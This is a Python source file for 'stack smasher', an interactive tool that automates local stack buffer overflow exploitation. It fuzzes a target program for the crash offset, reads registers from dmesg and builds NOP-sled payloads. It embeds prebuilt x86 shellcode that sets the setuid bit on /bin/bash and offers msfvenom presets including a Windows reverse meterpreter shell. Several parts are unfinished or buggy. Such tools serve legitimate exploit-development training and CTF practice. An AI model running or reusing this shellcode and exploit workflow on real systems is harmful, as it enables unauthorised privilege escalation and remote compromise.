#!/usr/bin/python3

titlepage = \
"""
##########################################################################################################
\#======================================================================================================\#
\#||                     _             _                              _                               ||\#
\#||                 ___| |_ __ _  ___| | __  ___ _ __ ___   __ _ ___| |__   ___ _ __                 ||\#
\#||                / __| __/ _` |/ __| |/ / / __| '_ ` _ \ / _` / __| '_ \ / _ \ '__|                ||\#
\#||                \__ \ || (_| | (__|   <  \__ \ | | | | | (_| \__ \ | | |  __/ |                   ||\#
\#||                |___/\__\__,_|\___|_|\_\ |___/_| |_| |_|\__,_|___/_| |_|\___|_|                   ||\#
\#||                                                                                                  ||\#
\#||                                                                                                  ||\#
\#======================================================================================================\#
\#||                                          stack smasher                                           ||\#
\#||                                               v0.2                                               ||\#
\#======================================================================================================\#
\#||                                                                                                  ||\#
\#||                                   Written by: Nicholas Morris                                    ||\#
\#||                             https://github.com/nm2438/stack_smasher                              ||\#
\#||                                                                                                  ||\#
\#||                                         Date: 06OCT2020                                          ||\#
\#||                                                                                                  ||\#
\#======================================================================================================\#
\#||    Tool for working with local and remote/socket-based buffer overflow exploits. Can            ||\#
\#||    overflow local executables with minimal user interaction. Remote exploits may require         ||\#
\#||    additional user effort. |!| Tools for bypassing stack canaries to be included in future       ||\#
\#||    release|!|                                                                                    ||\#
\#======================================================================================================\#
##########################################################################################################
"""

# Temp
def ud():
    print("Feature under development")

########################################################################################################
# Imports
########################################################################################################

import argparse
import os
import platform
import subprocess
import string
import re
from itertools import product

########################################################################################################
# Argparser
########################################################################################################

global parser
parser = argparse.ArgumentParser(description=f"Tool for overflowing buffers \n{ud()}")
# parser.add_argument


########################################################################################################
# Classes
########################################################################################################

class exploit:
    """
    Holds the variables needed to create and run a buffer overflow exploit
    """

    def __init__(self):
        """
        Initialize an exploit object
        """
        self.local_os = None
        self.target_os = None
        self.is_local = None
        self.nc_or_socket = None
        self.target_exe = None
        self.trigger_command = None
        self.buffer_size = None
        self.has_canary = None  # ud()
        self.target_eip = None
        self.prepend_nop_count = None
        self.append_nop_count = None
        self.shellcode = None
        self.payload = None


    def __str__(self):
        """
        Return string representation of exploit settings
        """
        string = "{\n"
        for key,value in self.__dict__.items():
            string += f"\t\"{key}\" : \"{value}\",\n"
        string += "}"
        return string


    def brief_descrip(self):
        """
        Print a brief description of the exploit
        """
        self.payload_generator()
        return "\n" + \
              f"Is Local: {self.is_local}\n" + \
              f"Target exe: {self.target_exe}\n" + \
              f"Payload: {self.payload}\n"


    def save(self):
        """
        Writes exploit settings out to a file
        """
        default = f"{os.getcwd()}/stacksmash"
        path = get_filepath("where you'd like to save your settings", default=default)
        with open(path, "w") as file:
            file.write(str(self))
        clear_screen()
        print("Saved the following settings:\n\n",self,sep="")
        input("\n\nPress ENTER to continue")


    def load(self):
        """
        Loads exploit settings from a file
        """
        default = f"{os.getcwd()}/stacksmash"
        path = get_filepath("of your saved exploit", default=default)
        with open(path, "r") as file:
            lines = file.readlines()
        for line in lines:
            if re.search(r'".+" : ".+"', line):
                words = line.split("\"")
                file_key, file_val = words[1], get_intended_type(words[3])
                for key,value in self.__dict__.items():
                    if key == file_key:
                        setattr(self, key, file_val)
                        break
        print("\nI loaded the following settings:\n\n",self,sep="")
        input("\n\nPress ENTER to continue")


    def find_buffer_size(self):
        """
        Find the buffer size to trigger a buffer overflow
        """
        # Linux process is easy, Windows not as much
        if self.local_os == "linux":
            print("\n[*] Getting buffer size...")
            for size in range(100,5000,50):
                if size % 100 == 0: print(f"\t[*] Trying with pattern of size {size}")
                pattern = gen_pattern(size)
                p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE, \
                    stderr = subprocess.STDOUT, shell=True, universal_newlines=True)
                output = p1.communicate(input=pattern)[0]
                if "segmentation" in output.lower():
                    print("\t[*] Successfully triggered overflow. Calculating offset...")
                    successful_pattern = gen_pattern(size)
                    break
            if not successful_pattern:
                print("\n#|| Unable to trigger overflow. Please calculate the offset " + \
                "manually and return")
                quit()
            check_dmesg(self, successful_pattern)
        else:
            # if local os is windows:
            ud()


    def set_shellcode(self):
        """
        Gets input from user and sets exploit shellcode accordingly
        """
        while True:
            response = get_input("\n#|| How would you like to generate your payload?\n" + \
                "\n[1] -- Use one of the built-in payloads\n2 -- Specify a msfvenom command" + \
                " (can be done without leaving tool)\n3 -- Copy/Paste your shellcode into " + \
                "the tool as a string\n",["1","2","3",""],default="1")
            if response == "1":
                # format:
                # description: (payload, args, bad_chars)
                available = { \
                            "linux: chmod u+s /bin/bash (prebuilt, no msfvenom required)": \
                                ("Preset","Preset","Preset"),
                            "linux: chmod u+s /bin/bash":("linux/x86/exec","CMD=\"chmod u+s /bin/bash\"", \
                                "\\x00\\x0a\\x0d"), \
                            "windows: reverse meterpreter":("windows/meterpreter/reverse_tcp", \
                                "LHOST=[] LPORT=[]", "\\x00\\x0a\\x0d") \
                            }
                print("\nThe following preset payloads are available:")
                keys = list(available.keys())
                values = list(available.values())
                for i in range(len(keys)):
                    print(f"{i} : {keys[i]}")
                options = [str(i) for i in range(len(keys))]
                options.append("b")
                response = get_input("\nEnter your selection: (0,2,...,n):\nOr, enter \"b\" to go back\n", \
                    options)
                if response == "b":
                    continue
                elif response == "0":
                    self.shellcode = "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
                    "2696e2f6261736800575389e1cd80"
                    break
                else:
                    i = int(response)
                    payload = values[i][0]
                    args = values[i][1]
                    bad_chars = values[i][2]
                    while True:
                        print(f"\nPayload: {payload}\n" + \
                            f"\nArguments: {args}" + \
                            f"\nBad Characters: {bad_chars}\n")
                        response = get_input("Would you like to edit one or more of the variables? (p/a/b/[n](no))", \
                            ["p","a","b","n",""], default="n")
                        if response == "n":
                            break
                        elif response == "p":
                            payload = input("\nEnter the new value:\n").strip()
                        elif response == "a":
                            args = input("\nEnter the new value:\n").strip()
                        elif response == "b":
                            bad_chars = input("\nEnter the new value:\n").strip()
                    self.shellcode = get_venom(payload, args, bad_chars)
                    break
            elif response == "2":
                while True:
                    payload = input("\nWhat msfvenom payload do you want to use?\n\t" + \
                        "Note:Error-checking is limited here, enter input carefully\n").strip()
                    args = input("\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
                    bad_chars = input("\nEnter any bad characters: (e.g. \"\x00\x0a\x0d\")\n").strip()
                    check = get_input("\nDoes your input look correct? ([y]/n):\n",["y","n",""],default="y")
                    if check == "y":
                        break
                self.shellcode = get_venom(payload, args, bad_chars)
                break
            else:
                while True:
                    payload = input("\nPaste your shellcode as a single line. Omit any quotes.\n")
                    check = get_input("\nDoes your input look correct? ([y]/n):\n",["y","n",""],default="y")
                    if check == "y":
                        break
                self.shellcode = payload.replace("\\x","")
                break
            response = None


    def get_info(self):
        """
        Get info from the user regarding exploit
        """
        plat_string = platform.system().strip().lower()
        if "linux" in plat_string:
            self.local_os = "linux"
        elif "windows" in plat_string:
            self.local_os = "windows"
        else:
            print("\n#|| Cannot reliably determine host OS")
            response = get_input("#|| What OS are you running? ([l]=linux/w=windows):\n", \
            ["l","w",""],default="l")
            os_key = {"l":"linux","w":"windows"}
            self.local_os = os_key[response]
        print(f"\n[*] Identified local OS as: {self.local_os.capitalize()}\n")

        # Is it local?
        if not self.is_local:
            response = get_input("#|| Is your target local? ([y]/n):\n", ["y","n",""],default="y")
            self.is_local = yn_key[response]

        # Split paths for local/remote
        if self.is_local:
            if not self.target_exe:
                self.target_exe = get_filepath("of your target",already_exists=True)
            if not self.trigger_command:
                response = get_input("\n#|| Do you need to prepend a specific command " + \
                "to trigger the vulnerability? (y/[n]):\n",["y","n",""],default="n")
                if yn_key[response]:
                    self.trigger_command = input("#|| Enter the command:\n").strip()
            if not self.buffer_size:
                response = get_input("#|| Do you know your target's buffer size? (y/[n]):\n", \
                ["y","n",""],default="n")
                if yn_key[response]:
                    response = get_input("#|| Enter buffer size:\n",[str(i) for i in range(10000)])
                    self.buffer_size = int(response)
                else:
                    self.find_buffer_size()
            if not self.target_eip:
                ud()
            count_options = [str(2*n) for n in range(1000)]
            count_options.append("")
            if not self.prepend_nop_count:
                response = get_input("#|| How many NOPS would you like to prepend? " + \
                "(Enter a multiple of 2) [16]\n",count_options, default="16") 
                self.prepend_nop_count = int(response)
            if not self.append_nop_count:
                response = get_input("#|| How many NOPS would you like to append? " + \
                "(Enter a multiple of 2) [16]\n",count_options, default="16") 
                self.append_nop_count = int(response)
            if not self.shellcode:
                self.set_shellcode()
        else:
            # get info for remote buffer overflow exploits
            ud()


    def payload_generator(self):
        '''
        Generates the overflow-triggering message
        '''
        # put EIP in correct order
        eip = ""
        for i in range(len(self.target_eip)):
            if i % 2 == 0:
                eip = self.target_eip[i:i+2] + eip

        if not self.has_canary:
            msg = "41"*self.buffer_size
            msg += eip
            msg += "90"*self.prepend_nop_count
            msg += self.shellcode
            msg += "90"*self.append_nop_count
        else:
            pass    # under construction
        self.payload = bytearray.fromhex(msg)


    def run(self):
        """
        Runs the exploit (i.e. delivers the payload to the target)
        """
        missing = "\nLooks like something's missing!\n"
        if self.is_local:
            # All local exploits
            if self.local_os == "linux":
                # Local Linux
                if self.buffer_size and self.target_eip and self.prepend_nop_count and self.shellcode and \
                    self.append_nop_count:
                    cmd_string = self.target_exe
                    sudo = yn_key[get_input("\nShould I run command as sudo? ([y]/n)\n", \
                        ["y","n",""],default="y")]
                    if sudo: cmd_string = "sudo " + cmd_string
                else:
                    print(missing)
                    return
            elif self.local_os == "windows":
                # Local Windows
                ud()
            # Back to all local exploits
        elif self.is_local == False:
            # All remote exploits
            ud()
        else:
            # .is_local failed to be defined
            print(missing)
            return

        num = int(get_input("\nEnter your eip confidence interval: ([1]-1000)\n" + \
            "Inverse scale -- larger confidence interval means more attempts\n" + \
            "For interval = n, I will conduct 2*(n+1) attempts\n", \
            [str(i) for i in range(1,1001)],default="1"))

        print("\n[*] Sending payload(s)!")

        # Save current eip
        original_eip = self.target_eip
        # the given eip will be run twice (add zero, subtract zero)
        responses = []
        for n in range(num+1):
            for num in [-n,n]:
                # Add n bytes to eip and run
                self.target_eip = str(hex(int(original_eip,16) + 8*num)).replace("0x","")
                self.payload_generator()
                p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                out = p.communicate(input=self.payload)[0].decode()
                responses.append("".join(out.split("\n")[-2:]))
                print("\t[*] Sent!")
        # Restore original target_eip
        self.target_eip = original_eip
        show = get_input("\nSaved last line of output from each attempt. View now? (y/[n])\n", \
            ["y","n",""], default="n")
        if yn_key[show]:
            for line in responses:
                print("\t"+line)
        input("\nFinished. Press ENTER to return.")


########################################################################################################
# Application-Specific Functions
########################################################################################################


def check_dmesg(exp, successful_pattern):
    """
    Get dmesg output on linux
    """
    dmesg = subprocess.check_output("dmesg | tail",stderr=subprocess.STDOUT, \
        shell=True, universal_newlines=True).split("\n")
    if "not permit" in dmesg:
        print("[*] Need sudo for dmesg. Trying now...")
        dmesg = subprocess.check_output("sudo dmesg | tail",stderr=subprocess.STDOUT, \
            shell=True, universal_newlines=True).split("\n")
    # print(dmesg)    # Debug
    err = ""
    for i in range(1,1+len(dmesg)):                    
        if "ip" in dmesg[-i] and "sp" in dmesg[-i]:
            err = dmesg[-i]
            print("\n"+err+"\n")
            break
    # print(last_line)    # Debug
    ip, sp = None, None
    if "ip" in err and "sp" in err:                    
        err = err.split()
        for i in range(len(err)):
            if err[i] == "ip":
                # handle 64 and 32 bit programs differently
                if err[i+1][:8] != "00000000":
                    ip = err[i+1]
                else:
                    ip = err[i+1][-8:]
            elif err[i] == "sp":
                if err[i+1][:8] != "00000000":
                    sp = err[i+1]
                else:
                    sp = err[i+1][-8:]
    if not ip or not sp:
        print("\n#|| Unable to read dmesg output. Please read output manually " + \
            "and enter the following values:\n#|| \tNote: Error catching here is " + \
            "limited, please enter input carefully\n(64 bit programs should have 16 " + \
            "digit addresses, 32 bit programs should have 8 digit addresses)\n")
        while True:
            print("\n#|| IP should look like: `400971` (value chosen arbitrarily)")
            ip = input("#|| Enter the IP (hex value only):\n") 
            print("#\n|| SP should look like: `ffffe5b8` (value chosen arbitrarily)")
            sp = input("#|| Enter the SP (hex value only):\n")
            check = get_input("#|| Does your input look correct? ([y]/n):\n",["y","n",""],default="y")
            if check == 'y':
                break                        
    exp.target_eip = sp
    exp.buffer_size = calculate_offset(successful_pattern, ip)
    print(f"[*] Identified buffer size as {exp.buffer_size} and target EIP as {exp.target_eip}")


def get_venom(payload, args, bad_chars):
    cmd_string = "msfvenom -p " + payload
    if len(args)>1:
        cmd_string += " " + args
    if len(bad_chars)>1:
        cmd_string += " -b " + bad_chars
    cmd_string += " -f python"

    output = subprocess.check_output(cmd_string,shell=True, universal_newlines=True)
    venom = [line for line in output.split("\n") if "buf +=" in line]
    for line in venom:
        i = line.find("\"")
        line = line[i+1:line.find("\"",i+1)]
    venom = "".join(venom)
    venom = venom.replace("\\x","")    
    return venom


def gen_pattern(size):
    # Initialize variables
    uppers = string.ascii_uppercase
    downers = string.ascii_lowercase
    digis = string.digits

    pattern_iter = iter(product(uppers,downers,digis))
    pattern = ""
    for i in range(0,size,3):
        pattern += "".join(next(pattern_iter))

    return pattern


def calculate_offset(pattern, register):
    chars = ""
    for i in range(len(register)):
        if i % 2 == 0:
            chars = chr(int(register[i:i+2],16)) + chars
    # print(register + "\n" + chars)    # Debug
    return pattern.index(chars)


def exploit_handler(exp):
    """
    Meta-method to guide the entire process of exploit development and running
    """
    exp.get_info() 
    header = "Welcome to the Exploit Menu"
    options = [
                "#|| {} -- VIEW EXPLOIT SETTINGS",
                "#|| {} -- CHANGE EXPLOIT SETTINGS",
                "#|| {} -- SAVE EXPLOIT SETTINGS",
                "#|| {} -- RUN EXPLOIT",
                "#|| {} -- EXIT EXPLOIT HANDLER"
              ]
    while True:
        clear_screen()
        choice = get_menu_choice(header, options)
        if choice == 0:
            clear_screen()
            print("Current Exploit Settings:\n\n", exp)
            input("\nPress ENTER to go back\n")
        elif choice == 1:
            ud()
            input("\nPress ENTER to go back\n")
        elif choice == 2:                
            exp.save()
        elif choice == 3:
            exp.run()
        elif choice == 4:
            break            
        else:
            input("Invalid option")


def main_menu():
    while True:
        options = [
                    "#|| {} -- HELP",
                    "#|| {} -- [NEW : Begin New Exploit]",
                    "#|| {} -- LOAD : Load Saved Exploit from File",
                    "#|| {} -- SELECT : Select one of the currently loaded exploits and " + \
                    "enter the exploit menu",
                    "#|| {} -- EXIT"
                  ]
        choice = get_menu_choice("Main Menu",options,default="1")
        if choice == 0:
            ud()
            parser.print_help()
            input("\nPress ENTER to continue")
        elif choice == 1:
            print("Beginning New Exploit...")
            exploits.append(exploit())
            exploit_handler(exploits[-1])
        elif choice == 2:
            exploits.append(exploit())
            exploits[-1].load()
            exploit_handler(exploits[-1])
        elif choice == 3:
            clear_screen()
            options = ["#|| Index: {}\n"+exploits[i].brief_descrip() for i in range(len(exploits))]
            options.append("\n#|| {} -- Return to Previous Menu")
            choice = get_menu_choice("Available Exploits",options)
            if choice == len(exploits):
                pass
            else:
                exploit_handler(exploits[choice])
        elif choice == 4:
            print("#|| Goodbye!")
            break
        clear_screen()


########################################################################################################
# General Purpose Functions
########################################################################################################


def get_intended_type(string):
    """
    Takes a string, returns the intended value/data type. Used for reading in a settings file
    """
    if string=="None":
        return None
    elif string=="True":
        return True
    elif string=="False":
        return False
    else:
        try:
            return int(string)
        except: pass
    return string


def get_filepath(path_of, already_exists=False, default=None):
    """
    Get a filepath from the user and check that it's valid
    """
    while True:
        print(f"#|| Enter the file path {path_of}:\n")
        if default:
            print("Press ENTER to use default filepath" + \
                  f"\nDefault filepath: {default}\n")
        response = input().strip()
        if response == "" and default:
            return default
        elif already_exists:
            if os.path.exists(response):
                if "/" not in response and "\\" not in response:
                    response = "./" + response
                return response
            else:
                print("#|| Not a valid file path")
        else:
            dirname = os.path.dirname(response) or os.getcwd()
            if os.access(dirname, os.W_OK):
                if "/" not in response and "\\" not in response:
                    response = "./" + response
                return response
            else:
                print("#|| Not a valid file path")


def clear_screen():
    """
    Attempts to clear the screen
    """
    try:
        if "windows" in platform.system().strip().lower():
            os.system("cls")
        else:
            os.system("clear")
    except:
        pass


def print_line(frmt, wdth, lines):
    '''
    Description:
        Prints the arguments in a pre-set manner
    Args:
        frmt - str
        wdth - int
        lines - list
    Returns:
        None
    '''
    [print(frmt.format(item, wdth)) for item in lines]


def listerator(text, wdth):
    '''
    Description:
        Breaks up a long string into a list of strings that fit
        nicely into a box of the given width
    Args:
        text - str
        wdth - width
    Returns:
        list of strings
    '''
    word_lst = list(text.split())
    word_lst.reverse()

    lines = ['']
    ctr = 0
    for _ in range(len(word_lst)):
        if len(lines[ctr]) + len(word_lst[-1]) + 1 > wdth:
            ctr += 1
            lines.append('')
        new_word = word_lst.pop()
        if not len(lines[ctr]) == 0:
            new_word = ' ' + new_word
        lines[ctr] += new_word
    return lines


def print_block(text, width, line, pad):
    '''
    Description:
        Formats a very long string into a nice block of text
    Args:
        text - str - a string to be printed
        width - int - the width of the 'box' to print in
        line - str - the string representation of the upper/lower box border
        pad - int - number of spaces between box border and text block
    Returns:
        None
    '''
    # generate box dimensions, formats
    txt_wdth = width-(2*pad)-6
    #num_lines = (len(text)//txt_wdth)+1
    if commented_output:
        frmt = '#||{1}{0}{1}||#'.format('{0:<{1}}', ' '*pad)
    else:
        frmt = '\\#||{1}{0}{1}||\\#'.format('{0:<{1}}', ' '*pad)

    # print block
    print(line)
    print_line(frmt, txt_wdth,
               listerator(text, txt_wdth))
    print(line)


def get_menu_choice(header, options, default=None):
    print_block(header, pagewidth, border_line, 8)
    print("\n")
    [print(options[i].format(i)) for i in range(len(options))]
    print("\n")
    choices = [str(i) for i in range(len(options))]
    prompt = f"\nMake your selection: (0..{len(options)-1}):\n"
    if default:
        choices.append("")
        choice = get_input(prompt, choices, default=default)
    else:
        choice = get_input(prompt, choices)
    return int(choice)


def get_input(prompt, valid, default=None):
    '''
    Gets and verifies user's menu choice
    '''
    while True:
        raw_input = input(prompt).strip().lower()
        if raw_input in valid:
            if raw_input == "" and default:
                raw_input = default
            return raw_input
        else:
            print("#|| Sorry, I didn't understand that\n")


########################################################################################################
# Main
########################################################################################################


if __name__ == "__main__":
    # Global Variables
    pagewidth = 104
    border_line = "\\" + '#'*pagewidth + "\\"
    commented_output = False
    yn_key = {'y':True,'n':False}
    exploits = []

    # Argument Parsing



    # Welcome Page, only displays on start
    print(titlepage)
    welcome = \
          "Buffer King can be run through the interactive menu, with command line switches, or a" + \
          " combination of the two. To see the command line switches, type \"Help\" or run" + \
          " `./bufferking.py -h` from the command line. Otherwise, press enter to begin " + \
          "the interactive menu, or type \"Exit\" to exit"
    print_block(welcome, pagewidth, border_line, 8)

    main_menu()